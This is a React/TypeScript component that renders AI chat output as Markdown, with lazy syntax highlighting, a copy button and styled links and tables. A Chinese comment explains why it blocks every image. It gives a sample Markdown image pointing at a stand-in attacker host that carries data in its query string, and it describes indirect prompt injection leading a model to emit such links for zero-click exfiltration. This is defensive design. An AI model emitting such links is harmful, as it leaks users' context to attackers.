// src/components/Markdown.tsx
import { Suspense, createElement, lazy, useState } from "react";
import type { ComponentType, CSSProperties } from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import type { SyntaxHighlighterProps } from "react-syntax-highlighter";
import { useI18n } from "../i18n/context";
import { CheckIcon, CopyIcon, WarningIcon } from "./icons";

/**
 * `Prism` 会静态打进 300 种语法（约 1 MB）。`PrismAsyncLight` 只加载实际用到的语言，
 * 主题也只取 one-dark 一个，代码块才与消息本身一起按需下载。
 */
const Highlighter = lazy(async () => {
  const [hl, theme] = await Promise.all([
    import("react-syntax-highlighter/dist/esm/prism-async-light"),
    import("react-syntax-highlighter/dist/esm/styles/prism/one-dark"),
  ]);
  const Prism = hl.default as unknown as ComponentType<SyntaxHighlighterProps>;
  const oneDark = theme.default;
  return {
    default: (props: SyntaxHighlighterProps) =>
      createElement(Prism, { ...props, style: oneDark }),
  };
});

const preStyle: CSSProperties = {
  margin: 0,
  borderRadius: "var(--radius-md)",
  border: "1px solid var(--c-border)",
  fontSize: "0.8125rem",
  background: "#1b1d23",
};

function PlainPre({ code }: { code: string }) {
  return (
    <pre className="m-0 overflow-x-auto rounded-[--radius-md] border border-line bg-[#1b1d23] px-3.5 py-3 font-mono text-[0.8125rem] leading-relaxed text-white/85">
      {code}
    </pre>
  );
}

function CodeBlock({ language, code }: { language: string; code: string }) {
  const { t } = useI18n();
  const [copied, setCopied] = useState(false);

  const copy = async () => {
    try {
      await navigator.clipboard.writeText(code);
      setCopied(true);
      setTimeout(() => setCopied(false), 1600);
    } catch {
      /* 非安全上下文下剪贴板不可用 */
    }
  };

  return (
    <div className="group/code relative my-3">
      <Suspense fallback={<PlainPre code={code} />}>
        <Highlighter
          language={language || "text"}
          PreTag="div"
          customStyle={preStyle}
          codeTagProps={{ style: { fontFamily: "var(--font-mono)" } }}
        >
          {code}
        </Highlighter>
      </Suspense>
      <div className="absolute right-1.5 top-1.5 flex items-center gap-1.5 opacity-0 transition-opacity group-hover/code:opacity-100 focus-within:opacity-100">
        {language && (
          <span className="rounded-[--radius-xs] bg-black/40 px-1.5 py-0.5 text-[10px] uppercase tracking-wide text-white/60">
            {language}
          </span>
        )}
        <button
          type="button"
          onClick={copy}
          aria-label={t("ui.copyCode")}
          className="rounded-[--radius-xs] bg-black/40 p-1 text-white/70 transition-ui hover:bg-black/60 hover:text-white"
        >
          {copied ? (
            <CheckIcon className="h-3.5 w-3.5" />
          ) : (
            <CopyIcon className="h-3.5 w-3.5" />
          )}
        </button>
      </div>
    </div>
  );
}

/** 绝对/相对 URL 都能解析出展示用的域名；解析不了就当没有域名（渲染处再兜 "?"）。 */
function safeHost(raw: string): string {
  try {
    return new URL(raw, window.location.origin).host;
  } catch {
    return "";
  }
}

export default function Markdown({ content }: { content: string }) {
  const { t } = useI18n();
  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      components={{
        /**
         * 模型输出里的图片一律不加载。
         *
         * `![x](https://attacker/p?d=…)` 不是一张图，而是**浏览器自己会发起的一个出站请求**：
         * 它带着用户的 Cookie/Referer 环境，可以把上下文按像素逐位外送（零点击外泄的真实先例
         * 是 M365 Copilot 的 EchoLeak）。这个产品是纯文本知识库 —— 上传白名单里连图片都不收，
         * 所以消息里的图片没有任何正当用途，而间接提示注入是可以让模型主动吐出这种链接的。
         * 拦掉之后不静默吞：把 alt 与目标域名显示出来，让用户知道模型想放什么、并据此判断那次回答。
         */
        img({ src, alt }) {
          const raw = typeof src === "string" ? src : "";
          const host = raw ? safeHost(raw) : "";
          return (
            <span
              className="my-1.5 inline-flex items-center gap-1.5 rounded-[--radius-xs] border border-line bg-surface-sunken px-2 py-1 text-[11px] text-ink-subtle"
              title={raw}
            >
              <WarningIcon className="h-3 w-3 shrink-0" aria-hidden />
              {t("ui.blockedImage", { host: host || "?" })}
              {alt ? ` · ${alt}` : ""}
            </span>
          );
        },
        code({ className, children, ...props }) {
          const match = /language-(\w+)/.exec(className || "");
          const raw = String(children).replace(/\n$/, "");
          // 行内代码：无语言标记且不含换行
          if (!match && !raw.includes("\n")) {
            return (
              <code className="font-mono text-[0.8125rem]" {...props}>
                {children}
              </code>
            );
          }
          return <CodeBlock language={match?.[1] ?? ""} code={raw} />;
        },
        a({ children, href, ...props }) {
          return (
            <a
              href={href}
              target="_blank"
              rel="noopener noreferrer"
              className="text-accent-ink underline decoration-accent-border underline-offset-2 hover:decoration-accent"
              {...props}
            >
              {children}
            </a>
          );
        },
        table({ children }) {
          return (
            <div className="my-3 overflow-x-auto rounded-[--radius-md] border border-line">
              <table className="a-table">{children}</table>
            </div>
          );
        },
        th({ children }) {
          return <th>{children}</th>;
        },
        td({ children }) {
          return <td>{children}</td>;
        },
        blockquote({ children }) {
          return (
            <blockquote className="my-2.5 border-l-2 border-accent-border pl-3 text-ink-muted not-italic">
              {children}
            </blockquote>
          );
        },
      }}
    >
      {content}
    </ReactMarkdown>
  );
}
